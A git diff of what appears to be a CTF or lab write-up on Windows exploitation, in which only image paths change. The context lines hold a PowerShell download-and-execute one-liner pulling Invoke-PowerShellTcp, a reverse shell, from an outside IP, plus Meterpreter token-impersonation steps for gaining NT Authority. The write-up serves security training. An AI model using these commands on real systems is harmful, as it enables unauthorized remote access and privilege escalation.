@@ -45,13 +45,13 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.135.134:8
 Invoke-PowerShellTcp
 ```
 
-<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;
 
 <figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -93,7 +93,7 @@ load incognito
 list_tokens -g
 ```
 
-![](<../../.gitbook/assets/image (17) (1).png>)
+![](<../../.gitbook/assets/image (17) (1) (1).png>)
 
 ```
 impersonate_token "BUILTIN\Administrators" 
@@ -102,7 +102,7 @@ getuid
 
 We are now NT Authority&#x20;
 
-<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Migrating processes to make sure we have correct permissions for the privileged user. The safest process to pick is the services.exe process
 
